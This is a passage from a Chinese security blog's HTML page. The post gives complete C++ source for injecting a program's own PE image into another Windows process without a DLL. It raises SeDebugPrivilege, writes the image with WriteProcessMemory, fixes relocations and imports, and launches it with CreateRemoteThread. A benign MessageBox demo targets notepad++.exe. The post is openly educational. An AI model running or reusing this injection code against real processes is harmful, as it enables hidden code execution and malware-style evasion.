class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div><div class="line">336</div><div class="line">337</div><div class="line">338</div><div class="line">339</div><div class="line">340</div><div class="line">341</div><div class="line">342</div><div class="line">343</div><div class="line">344</div><div class="line">345</div><div class="line">346</div><div class="line">347</div><div class="line">348</div><div class="line">349</div><div class="line">350</div><div class="line">351</div><div class="line">352</div><div class="line">353</div><div class="line">354</div><div class="line">355</div><div class="line">356</div><div class="line">357</div><div class="line">358</div><div class="line">359</div><div class="line">360</div><div class="line">361</div></pre></td><td class="code"><pre><div class="line">#pragma once</div><div class="line">class CInjectCode</div><div class="line">&#123;</div><div class="line">public:</div><div class="line">	CInjectCode(DWORD (*fn)(HINSTANCE));</div><div class="line">	~CInjectCode();</div><div class="line"></div><div class="line">	void SetRemoteThread_Main(DWORD(*fn)(HINSTANCE));</div><div class="line">	//注入</div><div class="line">	BOOL Inject(DWORD dwProcessID);</div><div class="line">	BOOL Inject(const wchar_t* wszProcessName);</div><div class="line"></div><div class="line">private:</div><div class="line">	//完成重定位</div><div class="line">	void RelocCode(LPBYTE lpImage, LPBYTE lpInjectBase);</div><div class="line">	//用于完成API函数的导入，参数为要插入代码处地址</div><div class="line">	BOOL LoadAPI(LPBYTE lpInjectBase);</div><div class="line">	//CreateRemoteThread的线程运行入口</div><div class="line">	DWORD ThreadEntry(LPBYTE  lpImageBase);</div><div class="line">	//通过进程名获取进程ID</div><div class="line">	BOOL GetProcessIDByName(const wchar_t* wszProcessName, DWORD&amp; dwProcID);</div><div class="line">	//提升se_debug权限</div><div class="line">	BOOL AdjustProcessTokenPrivilege();</div><div class="line">private:</div><div class="line">	//远程执行的函数指针</div><div class="line">	DWORD(*fnRemoteThread_Main)(HINSTANCE);</div><div class="line">&#125;;</div><div class="line"></div><div class="line"> </div><div class="line"></div><div class="line">#include "stdafx.h"</div><div class="line">#include "InjectCode.h"</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;tchar.h&gt;</div><div class="line">#include &lt;windows.h&gt;</div><div class="line">#include &lt;memory.h&gt;</div><div class="line">#include &lt;TlHelp32.h&gt;</div><div class="line"></div><div class="line">CInjectCode::CInjectCode(DWORD(*fn)(HINSTANCE))</div><div class="line">&#123;</div><div class="line">	SetRemoteThread_Main(fn);</div><div class="line">&#125;</div><div class="line"></div><div class="line">CInjectCode::~CInjectCode()</div><div class="line">&#123;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void CInjectCode::SetRemoteThread_Main(DWORD(*fn)(HINSTANCE))</div><div class="line">&#123;</div><div class="line">	fnRemoteThread_Main = fn;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//提升se_debug权限</div><div class="line">BOOL CInjectCode::AdjustProcessTokenPrivilege()</div><div class="line">&#123;</div><div class="line">	LUID luidTmp;</div><div class="line">	HANDLE hToken;</div><div class="line">	TOKEN_PRIVILEGES tkp;</div><div class="line"></div><div class="line">	if (!OpenProcessToken(GetCurrentProcess(), TOKEN\_ADJUST\_PRIVILEGES | TOKEN_QUERY, &amp;hToken))</div><div class="line">	&#123;</div><div class="line">		OutputDebugString(_T("AdjustProcessTokenPrivilege OpenProcessToken Failed ! n"));</div><div class="line"></div><div class="line">		return FALSE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	if (!LookupPrivilegeValue(NULL, SE\_DEBUG\_NAME, &amp;luidTmp))</div><div class="line">	&#123;</div><div class="line">		OutputDebugString(_T("AdjustProcessTokenPrivilege LookupPrivilegeValue Failed ! n"));</div><div class="line"></div><div class="line">		CloseHandle(hToken);</div><div class="line"></div><div class="line">		return FALSE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	tkp.PrivilegeCount = 1;</div><div class="line">	tkp.Privileges\[0\].Luid = luidTmp;</div><div class="line">	tkp.Privileges\[0\].Attributes = SE\_PRIVILEGE\_ENABLED;</div><div class="line"></div><div class="line">	if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL))</div><div class="line">	&#123;</div><div class="line">		OutputDebugString(_T("AdjustProcessTokenPrivilege AdjustTokenPrivileges Failed ! n"));</div><div class="line"></div><div class="line">		CloseHandle(hToken);</div><div class="line"></div><div class="line">		return FALSE;</div><div class="line">	&#125;</div><div class="line">	return TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//完成重定位</div><div class="line">void CInjectCode::RelocCode(LPBYTE lpImage, LPBYTE lpInjectBase)</div><div class="line">&#123;</div><div class="line">	DWORD  dwRva = 0, dwRvaCount = 0, dwRelocOffset = 0;</div><div class="line">	LPWORD  lpwOffset = NULL;</div><div class="line">	PIMAGE\_NT\_HEADERS pNtHeader = NULL;</div><div class="line">	LPBYTE lpRelocTable;</div><div class="line">	PIMAGE\_BASE\_RELOCATION  pBaseReloc;</div><div class="line"></div><div class="line">	//获取ntheader</div><div class="line">	pNtHeader = (PIMAGE\_NT\_HEADERS)(lpImage + ((PIMAGE\_DOS\_HEADER)lpImage)-&gt;e_lfanew);</div><div class="line">	//获取重定位表位置</div><div class="line">	lpRelocTable = lpImage + pNtHeader-&gt;OptionalHeader.DataDirectory\[5\].VirtualAddress;</div><div class="line">	pBaseReloc = (PIMAGE\_BASE\_RELOCATION)lpRelocTable;</div><div class="line">	//获取重定位表偏移</div><div class="line">	dwRelocOffset = (DWORD)lpInjectBase - pNtHeader-&gt;OptionalHeader.ImageBase;</div><div class="line"></div><div class="line">	//遍历重定位表，修正需要重定位的代码</div><div class="line">	while (pBaseReloc-&gt;VirtualAddress != NULL)</div><div class="line">	&#123;</div><div class="line">		lpwOffset = (WORD*)(lpRelocTable + sizeof(IMAGE\_BASE\_RELOCATION));</div><div class="line">		dwRvaCount = (pBaseReloc-&gt;SizeOfBlock - sizeof(IMAGE\_BASE\_RELOCATION)) / 2;</div><div class="line"></div><div class="line">		//循环修正</div><div class="line">		for (DWORD i = 0; i &lt; dwRvaCount; i++)</div><div class="line">		&#123;</div><div class="line">			//获取要修正的RVA</div><div class="line">			dwRva = (DWORD)lpImage + (pBaseReloc-&gt;VirtualAddress) + (DWORD)(*lpwOffset &amp; 0x0fff);</div><div class="line">			//RVA加上修正量进行修正</div><div class="line">			*(DWORD*)dwRva += dwRelocOffset;</div><div class="line">			lpwOffset++;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		//指向下一页重定位信息处</div><div class="line">		lpRelocTable += pBaseReloc-&gt;SizeOfBlock;</div><div class="line">		pBaseReloc = (PIMAGE\_BASE\_RELOCATION)lpRelocTable;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//用于完成API函数的导入，参数为要插入代码处地址</div><div class="line">BOOL CInjectCode::LoadAPI(LPBYTE lpInjectBase)</div><div class="line">&#123;</div><div class="line">	PIMAGE\_DOS\_HEADER pDosHeader = (PIMAGE\_DOS\_HEADER)lpInjectBase;</div><div class="line">	PIMAGE\_NT\_HEADERS pNtHeader = (PIMAGE\_NT\_HEADERS)(lpInjectBase + pDosHeader-&gt;e_lfanew);</div><div class="line">	PIMAGE\_IMPORT\_DESCRIPTOR pImportDescriptor = (PIMAGE\_IMPORT\_DESCRIPTOR)</div><div class="line">		(lpInjectBase + pNtHeader-&gt;OptionalHeader.DataDirectory\[1\].VirtualAddress);</div><div class="line">	for (; pImportDescriptor-&gt;OriginalFirstThunk != 0; pImportDescriptor++)//遍历导入表</div><div class="line">	&#123;</div><div class="line">		HMODULE hDll = LoadLibraryA((LPCSTR)(lpInjectBase + pImportDescriptor-&gt;Name));</div><div class="line">		//上面能直接引用LoadLibrary是由于本地和远程进程中该函数地址都是相同的</div><div class="line">		if (hDll == NULL)</div><div class="line">			return FALSE;</div><div class="line">		PIMAGE\_THUNK\_DATA Origin = (PIMAGE\_THUNK\_DATA)(lpInjectBase + pImportDescriptor-&gt;OriginalFirstThunk);</div><div class="line">		PIMAGE\_THUNK\_DATA First = (PIMAGE\_THUNK\_DATA)(lpInjectBase + pImportDescriptor-&gt;FirstThunk);</div><div class="line">		LPCSTR Name = NULL;</div><div class="line">		PIMAGE\_IMPORT\_BY\_NAME Import\_name = NULL;</div><div class="line">		for (; Origin-&gt;u1.Ordinal != 0; Origin++, First++)</div><div class="line">		&#123;</div><div class="line">			if (Origin-&gt;u1.Ordinal &amp; IMAGE\_ORDINAL\_FLAG)</div><div class="line">				Name = (LPCSTR)IMAGE_ORDINAL(Origin-&gt;u1.Ordinal);</div><div class="line">			else</div><div class="line">			&#123;</div><div class="line">				Import\_name = (PIMAGE\_IMPORT\_BY\_NAME)(lpInjectBase + (DWORD)(Origin-&gt;u1.AddressOfData));</div><div class="line">				Name = (LPCSTR)Import_name-&gt;Name;</div><div class="line">			&#125;</div><div class="line">			First-&gt;u1.Function = (DWORD)GetProcAddress(hDll, Name);</div><div class="line">			//上面能直接引用GetProcAddress是由于本地和远程进程中该函数地址都是相同的</div><div class="line">			if (First-&gt;u1.Function == NULL)</div><div class="line">				return FALSE;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	return TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//CreateRemoteThread的线程运行入口</div><div class="line">DWORD CInjectCode::ThreadEntry(LPBYTE  lpImageBase)</div><div class="line">&#123;</div><div class="line">	if (LoadAPI(lpImageBase))//先完成API函数的导入工作</div><div class="line">		fnRemoteThread\_Main((HINSTANCE)lpImageBase);  //执行函数RemoteThread\_Main中的代码</div><div class="line">	return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//通过进程名获取进程ID</div><div class="line">BOOL CInjectCode::GetProcessIDByName(const wchar_t* wszProcessName, DWORD&amp; dwProcID)</div><div class="line">&#123;</div><div class="line">	HANDLE hSnapShot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, dwProcID);</div><div class="line">	PROCESSENTRY32 pe = &#123; sizeof(pe) &#125;;</div><div class="line">	BOOL bOk = ::Process32First(hSnapShot, &amp;pe);</div><div class="line">	while (bOk)</div><div class="line">	&#123;</div><div class="line">		if (wcsstr(pe.szExeFile, wszProcessName) != NULL)</div><div class="line">		&#123;</div><div class="line">			dwProcID = pe.th32ProcessID;</div><div class="line">			return TRUE;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		bOk = ::Process32Next(hSnapShot, &amp;pe);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	::CloseHandle(hSnapShot);</div><div class="line"></div><div class="line">	return FALSE;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//远程注入</div><div class="line">BOOL CInjectCode::Inject(DWORD dwProcessID)</div><div class="line">&#123;</div><div class="line">	LPBYTE lpNewMoudle = NULL;</div><div class="line">	HANDLE hRemoteProcess = NULL;</div><div class="line">	HANDLE hRemoteThread = NULL;</div><div class="line">	BOOL bRet = TRUE;</div><div class="line"></div><div class="line">	__try</div><div class="line">	&#123;</div><div class="line">		//获取自身句柄</div><div class="line">		LPBYTE lpMoudle = NULL;</div><div class="line">		lpMoudle = (LPBYTE)GetModuleHandle(NULL);</div><div class="line">		if (lpMoudle == NULL)</div><div class="line">		&#123;</div><div class="line">			OutputDebugString(_T("GetModuleHandle failedn"));</div><div class="line">			bRet = FALSE;</div><div class="line">			__leave;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		//获取NT_HEADER</div><div class="line">		PIMAGE\_NT\_HEADERS pNtHeader = NULL;</div><div class="line">		pNtHeader = (PIMAGE\_NT\_HEADERS)(lpMoudle + ((PIMAGE\_DOS\_HEADER)lpMoudle)-&gt;e_lfanew);</div><div class="line"></div><div class="line">		//得到自身映像大小</div><div class="line">		DWORD dwImageSize;</div><div class="line">		dwImageSize = pNtHeader-&gt;OptionalHeader.SizeOfImage;</div><div class="line"></div><div class="line">		//在当前空间申请空间存放自身代码</div><div class="line">		lpNewMoudle = (LPBYTE)VirtualAlloc(NULL, dwImageSize, MEM\_COMMIT | MEM\_RESERVE,</div><div class="line">			PAGE\_EXECUTE\_READWRITE);</div><div class="line">		if (lpNewMoudle == NULL)</div><div class="line">		&#123;</div><div class="line">			OutputDebugString(_T("VirtualAlloc failedn"));</div><div class="line">			bRet = FALSE;</div><div class="line">			__leave;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		//拷贝自身到buffer</div><div class="line">		PIMAGE\_NT\_HEADERS pNewNtHeader = NULL;</div><div class="line">		memcpy_s(lpNewMoudle, dwImageSize, lpMoudle, dwImageSize);</div><div class="line"></div><div class="line">		//获取Buffer中NtHeader</div><div class="line">		pNewNtHeader = (PIMAGE\_NT\_HEADERS)(lpNewMoudle + ((PIMAGE\_DOS\_HEADER)lpMoudle)-&gt;e_lfanew);	</div><div class="line"></div><div class="line">		//提升权限</div><div class="line">		if (!AdjustProcessTokenPrivilege())</div><div class="line">		&#123;</div><div class="line">			OutputDebugString(_T("OpenProcess failedn"));</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		//打开远程进程</div><div class="line">		hRemoteProcess = OpenProcess(PROCESS\_ALL\_ACCESS, FALSE, dwProcessID);</div><div class="line">		if (hRemoteProcess == NULL)</div><div class="line">		&#123;</div><div class="line">			OutputDebugString(_T("OpenProcess failedn"));</div><div class="line">			bRet = FALSE;</div><div class="line">			__leave;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		//在远程进程申请空间</div><div class="line">		LPBYTE lpInjectPoint;</div><div class="line">		lpInjectPoint = (LPBYTE)VirtualAllocEx(hRemoteProcess, 0, dwImageSize, MEM\_COMMIT, PAGE\_EXECUTE_READWRITE);</div><div class="line">		if (lpInjectPoint == NULL)</div><div class="line">		&#123;</div><div class="line">			OutputDebugString(_T("VirtualAllocEx failedn"));</div><div class="line">			bRet = FALSE;</div><div class="line">			__leave;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		//重定位NewMoudle代码</div><div class="line">		RelocCode(lpNewMoudle, lpInjectPoint);</div><div class="line"></div><div class="line">		//得到ThreadEntry在远程进程中的地址</div><div class="line">		LPTHREAD\_START\_ROUTINE lpRemoteEntryPoint;</div><div class="line">		LPBYTE lpParam;</div><div class="line">		lpRemoteEntryPoint = (LPTHREAD\_START\_ROUTINE)(lpInjectPoint + (DWORD)fnRemoteThread_Main - lpMoudle);</div><div class="line"></div><div class="line">		//将插入点地址作为参数传递给线程函数</div><div class="line">		lpParam = lpInjectPoint;</div><div class="line"></div><div class="line">		//将重定位好的代码通过WriteProcessMemory写入远程进程的内存空间中</div><div class="line">		if (!WriteProcessMemory(hRemoteProcess, lpInjectPoint, lpNewMoudle, dwImageSize, NULL))</div><div class="line">		&#123;</div><div class="line">			OutputDebugString(_T("WriteProcessMemory failedn"));</div><div class="line">			bRet = FALSE;</div><div class="line">			__leave;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		//通过CreateRemoteThread启动刚写入的代码，参数为Param</div><div class="line">		hRemoteThread = CreateRemoteThread(hRemoteProcess, NULL, 0, lpRemoteEntryPoint, lpParam, 0, NULL);</div><div class="line">		if (hRemoteThread == NULL)</div><div class="line">		&#123;</div><div class="line">			OutputDebugString(_T("CreateRemoteThread failedn"));</div><div class="line">			bRet = FALSE;</div><div class="line">			__leave;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		// 		//等待线程执行完成</div><div class="line">		// 		WaitForSingleObject(hRemoteThread, INFINITE);</div><div class="line">		// </div><div class="line">		// 		//获取完成</div><div class="line">		// 		DWORD dwExitCode;</div><div class="line">		// 		if (!GetExitCodeThread(hRemoteThread, &amp;dwExitCode))</div><div class="line">		// 		&#123;</div><div class="line">		// 			OutputDebugString(_T("GetExitCodeThread failedn"));</div><div class="line">		// 			bRet = FALSE;</div><div class="line">		// 			__leave;</div><div class="line">		//		&#125;</div><div class="line"></div><div class="line">	&#125;</div><div class="line"></div><div class="line">	__finally</div><div class="line">	&#123;</div><div class="line">		if (lpNewMoudle != NULL)</div><div class="line">		&#123;</div><div class="line">			VirtualFree(lpNewMoudle, 0, MEM_RELEASE);</div><div class="line">		&#125;</div><div class="line">		if (hRemoteProcess != NULL)</div><div class="line">		&#123;</div><div class="line">			CloseHandle(hRemoteProcess);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	return bRet;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//重载使用进程名</div><div class="line">BOOL CInjectCode::Inject(const wchar_t* wszProcessName)</div><div class="line">&#123;</div><div class="line">	DWORD dwProcID;</div><div class="line">	if (GetProcessIDByName(wszProcessName, dwProcID))</div><div class="line">	&#123;</div><div class="line">		return Inject(dwProcID);</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">	&#123;</div><div class="line">		OutputDebugString(_T("GetProcessIDByName failedn"));</div><div class="line">		return FALSE;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">附上使用demo</div><div class="line"></div><div class="line">#include "InjectCode.h"</div><div class="line"></div><div class="line">//远程要执行的代码，在这里只演示MessageBox</div><div class="line">DWORD RemoteThread_Main1(HINSTANCE hInstance)</div><div class="line">&#123;</div><div class="line">	::MessageBox(0, \_T("远程线程插入成功！"), \_T("远程线程"), 0);</div><div class="line">	return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">DWORD RemoteThread_Main2(HINSTANCE hInstance)</div><div class="line">&#123;</div><div class="line">	::MessageBox(0, \_T("远程线程插入成功！"), \_T("远程线程"), 0);</div><div class="line">	return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int \_tmain(int argc, \_TCHAR* argv\[\])</div><div class="line">&#123;</div><div class="line">	CInjectCode injectcode(RemoteThread_Main1);</div><div class="line">	if injectcode.Inject(L"notepad++.exe");</div><div class="line">	injectcode.SetRemoteThread\_Main(RemoteThread\_Main2);</div><div class="line">	injectcode.Inject(164);</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
                    
                        
                    
                    
                        <p>
                            <a href="/uncategorized/remote-thread-injection-without-dll/#post-footer" class="postShorten-excerpt_link link">
                                Comment and share
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    <div class="pagination-bar">
    <ul class="pagination">
        
        
        <li class="pagination-next">
            <a class="btn btn--default btn--small" href="/archives/page/2/">
                    <span>OLDER POSTS</span>
                <i class="fa fa-angle-right text-base icon-ml"></i>
            </a>
        </li>
        
        <li class="pagination-number">page 1 of 2</li>
    </ul>
</div>

</section>



                <footer id="footer" class="main-content-wrap">
    <span class="copyrights">
        Copyrights &copy; 2019 Eadom. All Rights Reserved.
    </span>
</footer>

            </div>
            
        </div>
        


    
        
    

<div id="about">
    <div id="about-card">
        <div id="about-btn-close">
            <i class="fa fa-remove"></i>
        </div>
        
            <img id="about-card-picture" src="/assets/images/avatar.jpg" alt="Author&#39;s picture"/>
        
            <h4 id="about-card-name">Eadom</h4>
        
            <div id="about-card-bio"><p>NO PWN NO FUN</p>
</div>
        
        
            <div id="about-card-job">
                <i class="fa fa-briefcase"></i>
                <br/>
                <p>@Alibaba</p>

            </div>
        
        
            <div id="about-card-location">
                <i class="fa fa-map-marker"></i>
                <br/>
                Hangzhou
            </div>
        
    </div>
</div>

        <div id="algolia-search-modal" class="modal-container">
    <div class="modal">
        <div class="modal-header">
            <span class="close-button"><i class="fa fa-close"></i></span>
            <a href="https://algolia.com" target="_blank" class="searchby-algolia text-color-light link-unstyled">
                <span class="searchby-algolia-text text-color-light text-small">by</span>
                <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
            </a>
            <i class="search-icon fa fa-search"></i>
            <form id="algolia-search-form">
                <input type="text" id="algolia-search-input" name="search"
                    class="form-control input--large search-input" placeholder="Search "
                    autofocus="autofocus"/>
            </form>
        </div>
        <div class="modal-body">
            <div class="no-result text-color-light text-center">no post found</div>
            <div class="results">
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="https://blog.eadom.net/writeups/bctf2014-crypto100-writeup/">
                            <h3 class="media-heading">BCTF2014线上赛crypto100混沌密码锁writeup</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Apr 2, 2014
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="https://blog.eadom.net/writeups/bctf2014-crypto300-writeup/">
                            <h3 class="media-heading">BCTF2014线上赛crypto300比特币钱包writeup</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Apr 2, 2014
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="https://blog.eadom.net/writeups/bctf2014-crypto400-writeup/">
                            <h3 class="media-heading">BCTF2014线上赛crypto400地铁难挤writeup</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Apr 2, 2014
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="https://blog.eadom.net/uncategorized/lianliankan-cheater/">
                            <h3 class="media-heading">连连看外挂——人生真是寂寞如雪啊</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Apr 2, 2014
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="https://blog.eadom.net/uncategorized/rjsupplicant-for-linux/">
                            <h3 class="media-heading">rjsupplicant for linux 锐捷代理破除多网卡限制</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Apr 3, 2014
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="https://blog.eadom.net/uncategorized/process-monoalphabetic-substitution-cipher/">
                            <h3 class="media-heading">辅助处理单表替换密码</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Apr 6, 2014
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="https://blog.eadom.net/writeups/actf2014-crypto100-writerup/">
                            <h3 class="media-heading">ACTF2014之crypto100古老writerup</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Apr 7, 2014
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="https://blog.eadom.net/writeups/actf2014-crypto200-writerup/">
                            <h3 class="media-heading">ACTF2014之crypto200买不到票的怨念writerup</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Apr 7, 2014
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="https://blog.eadom.net/uncategorized/dll-injection/">
                            <h3 class="media-heading">远程线程注入之DLL注入</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Jun 19, 2014
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="https://blog.eadom.net/uncategorized/remote-thread-injection-without-dll/">
                            <h3 class="media-heading">不注入DLL实现远程线程注入</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Jun 25, 2014
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
            </div>
        </div>
        <div class="modal-footer">
            <p class="results-count text-medium"
                data-message-zero="no post found"
                data-message-one="1 post found"
                data-message-other="{n} posts found">
                19 posts found
            </p>
        </div>
    </div>
</div>
        
<div id="cover" style="background-image:url('/assets/images/cover.png');"></div>
        <!--SCRIPTS-->
<script src="/assets/js/script-rt08quwts7iav5x0cfd2ym0gb5qkd1lvrsmwrakxtkhefmaaes4ywkmnjnwf.min.js"></script>
<!--SCRIPTS END-->



    </body>
</html>
